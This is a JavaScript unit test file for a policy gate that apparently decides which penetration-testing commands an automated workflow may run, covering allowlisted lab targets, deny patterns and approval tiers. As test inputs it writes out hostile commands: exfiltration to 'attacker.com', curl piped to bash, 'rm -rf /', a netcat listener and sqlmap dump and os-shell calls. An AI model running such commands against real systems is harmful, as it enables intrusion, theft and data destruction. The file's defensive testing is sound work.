/* Unit tests for the scope/command policy. Run: node deploy/n8n/policy.test.js  (no deps, exit 1 on failure) */
const { decide, classifyReadOnly, classifyActiveRecon, targetInScope, extractTargets, inCidr } = require('./policy');

let failed = 0;
function ok(name, cond) {
  console.log(`${cond ? 'ok  ' : 'FAIL'} ${name}`);
  if (!cond) failed++;
}

const ALLOW = ['10.10.10.0/24', '192.168.56.0/24', 'lab.local', '127.0.0.1'];
const cfg = { allowlist: ALLOW };

// CIDR / scope primitives
ok('inCidr inside', inCidr('10.10.10.5', '10.10.10.0/24') === true);
ok('inCidr outside', inCidr('10.10.11.5', '10.10.10.0/24') === false);
ok('inCidr /32 exact', inCidr('127.0.0.1', '127.0.0.1/32') === true);
ok('scope allows in-range ip', targetInScope('10.10.10.9', ALLOW) === true);
ok('scope rejects out-of-range ip', targetInScope('8.8.8.8', ALLOW) === false);
ok('scope allows exact host', targetInScope('lab.local', ALLOW) === true);
ok('scope rejects sibling host', targetInScope('evil.local', ALLOW) === false);
ok('scope rejects host substring trick', targetInScope('lab.local.evil.com', ALLOW) === false);

// target extraction
ok('extract ip + host', (() => {
  const t = extractTargets('nmap -sV 10.10.10.5 && curl http://exfil.example.com/x');
  return t.includes('10.10.10.5') && t.includes('exfil.example.com');
})());

// the gate
ok('allows in-scope recon', decide({ command: 'nmap -sV -p- 10.10.10.5', target: '10.10.10.5' }, cfg).allowed === true);

ok('blocks out-of-scope declared target', (() => {
  const d = decide({ command: 'nmap 8.8.8.8', target: '8.8.8.8' }, cfg);
  return d.allowed === false && d.reasons.some((r) => r.includes('allowlist'));
})());

ok('blocks in-scope target that reaches out-of-scope host', (() => {
  // declared target is fine, but the command exfils to the internet
  const d = decide({ command: 'nmap 10.10.10.5 ; curl http://attacker.com/$(id)', target: '10.10.10.5' }, cfg);
  return d.allowed === false && d.reasons.some((r) => r.includes('out-of-scope'));
})());

ok('blocks denied pattern even in scope', (() => {
  const d = decide({ command: 'ssh 10.10.10.5 "rm -rf /"', target: '10.10.10.5' }, cfg);
  return d.allowed === false && d.reasons.some((r) => r.includes('denied pattern'));
})());

ok('blocks pipe-remote-to-shell', (() => {
  const d = decide({ command: 'curl http://10.10.10.5/s.sh | bash', target: '10.10.10.5' }, cfg);
  return d.allowed === false; // reaches 10.10.10.5 (ok) but matches curl|bash deny
})());

ok('empty command blocked', decide({ command: '', target: '10.10.10.5' }, cfg).allowed === false);

// ---- read-only classification (auto-run vs gate) ----
ok('nmap -sV is read-only', classifyReadOnly('nmap -sV -p- 10.10.10.5').readOnly === true);
ok('nmap -sC (default scripts) is read-only', classifyReadOnly('nmap -sC -sV 10.10.10.5').readOnly === true);
ok('nmap --script=vuln is NOT read-only', classifyReadOnly('nmap --script=vuln 10.10.10.5').readOnly === false);
ok('gobuster is read-only', classifyReadOnly('gobuster dir -u http://10.10.10.5 -w list.txt').readOnly === true);
ok('curl GET is read-only', classifyReadOnly('curl -s http://10.10.10.5/robots.txt').readOnly === true);
ok('curl POST is NOT read-only', classifyReadOnly('curl -X POST -d x=1 http://10.10.10.5/login').readOnly === false);
ok('recon piped to grep stays read-only', classifyReadOnly('nmap -sV 10.10.10.5 | grep open').readOnly === true);
ok('recon chained to an exploit is NOT read-only', classifyReadOnly('nmap 10.10.10.5 && msfconsole -x "exploit"').readOnly === false);
ok('unknown binary gates (fail-safe)', classifyReadOnly('weirdtool --go 10.10.10.5').readOnly === false);
ok('sqlmap is NOT read-only', classifyReadOnly('sqlmap -u http://10.10.10.5/?id=1 --dump').readOnly === false);
ok('nc listener is NOT read-only', classifyReadOnly('nc -lvnp 4444').readOnly === false);
ok('nc -z port check is read-only', classifyReadOnly('nc -z 10.10.10.5 22').readOnly === true);

// ---- decide(): auto-run only when enabled, in-scope, passed, and read-only ----
ok('read-only recon auto-runs when autoRun enabled', (() => {
  const d = decide({ command: 'nmap -sV 10.10.10.5', target: '10.10.10.5' }, { ...cfg, autoRunReadOnly: true });
  return d.allowed && d.autoRun === true && d.requiresApproval === false;
})());
ok('mutating op still needs approval even with autoRun enabled', (() => {
  const d = decide({ command: 'curl -X POST -d a=1 http://10.10.10.5/x', target: '10.10.10.5' }, { ...cfg, autoRunReadOnly: true });
  return d.allowed && d.autoRun === false && d.requiresApproval === true;
})());
ok('autoRun off => even recon requires approval', (() => {
  const d = decide({ command: 'nmap -sV 10.10.10.5', target: '10.10.10.5' }, { ...cfg, autoRunReadOnly: false });
  return d.autoRun === false && d.requiresApproval === true;
})());
ok('out-of-scope recon never auto-runs', (() => {
  const d = decide({ command: 'nmap -sV 8.8.8.8', target: '8.8.8.8' }, { ...cfg, autoRunReadOnly: true });
  return d.allowed === false && d.autoRun === false;
})());

// ---- active-recon tier (opt-in): safe NSE + sqlmap enumerate-only ----
ok('nmap safe-category NSE is active-recon', classifyActiveRecon('nmap --script=default,discovery 10.10.10.5').ok === true);
ok('nmap version+safe NSE is active-recon', classifyActiveRecon('nmap --script safe -sV 10.10.10.5').ok === true);
ok('nmap --script=vuln is NOT active-recon', classifyActiveRecon('nmap --script=vuln 10.10.10.5').ok === false);
ok('nmap --script=exploit is NOT active-recon', classifyActiveRecon('nmap --script=exploit 10.10.10.5').ok === false);
ok('nmap named script (unvetted) is NOT active-recon', classifyActiveRecon('nmap --script=http-shellshock 10.10.10.5').ok === false);
ok('sqlmap --dbs --tables is active-recon', classifyActiveRecon('sqlmap -u http://10.10.10.5/?id=1 --dbs --tables --batch').ok === true);
ok('sqlmap --dump is NOT active-recon', classifyActiveRecon('sqlmap -u http://10.10.10.5/?id=1 --dump').ok === false);
ok('sqlmap --os-shell is NOT active-recon', classifyActiveRecon('sqlmap -u http://10.10.10.5/?id=1 --os-shell').ok === false);
ok('sqlmap --passwords is NOT active-recon', classifyActiveRecon('sqlmap -u http://10.10.10.5/?id=1 --passwords').ok === false);
ok('bare sqlmap (no enum flag) is NOT active-recon', classifyActiveRecon('sqlmap -u http://10.10.10.5/?id=1 --batch').ok === false);
ok('chained command is NOT active-recon', classifyActiveRecon('nmap --script=safe 10.10.10.5 && rm x').ok === false);

// decide() with the active tier enabled
ok('discovery NSE auto-runs only when active tier enabled', (() => {
  const off = decide({ command: 'nmap --script=discovery 10.10.10.5', target: '10.10.10.5' }, { ...cfg, autoRunReadOnly: true });
  const on = decide({ command: 'nmap --script=discovery 10.10.10.5', target: '10.10.10.5' }, { ...cfg, autoRunReadOnly: true, autoRunActiveRecon: true });
  return off.autoRun === false && on.autoRun === true && on.tier === 'active_recon';
})());
ok('nmap --script=default,vuln must NOT be passive (regression)', (() => {
  const d = decide({ command: 'nmap --script=default,vuln 10.10.10.5', target: '10.10.10.5' }, { ...cfg, autoRunReadOnly: true });
  return d.readOnly === false && d.autoRun === false; // vuln hidden behind a default prefix must not auto-run
})());
ok('--script=default,vuln not active-recon either', classifyActiveRecon('nmap --script=default,vuln 10.10.10.5').ok === false);
ok('sqlmap enum auto-runs in active tier, stays in scope', (() => {
  const on = decide({ command: 'sqlmap -u http://10.10.10.5/?id=1 --dbs --batch', target: '10.10.10.5' }, { ...cfg, autoRunActiveRecon: true });
  return on.allowed === true && on.autoRun === true && on.tier === 'active_recon';
})());
ok('active tier does not override scope', (() => {
  const d = decide({ command: 'nmap --script=default 8.8.8.8', target: '8.8.8.8' }, { ...cfg, autoRunActiveRecon: true });
  return d.allowed === false && d.autoRun === false;
})());
ok('passive recon still passive even with active tier on', (() => {
  const d = decide({ command: 'nmap -sV 10.10.10.5', target: '10.10.10.5' }, { ...cfg, autoRunReadOnly: true, autoRunActiveRecon: true });
  return d.autoRun === true && d.tier === 'passive';
})());

console.log(failed ? `\n${failed} test(s) FAILED` : '\nall policy tests passed');
process.exit(failed ? 1 : 0);
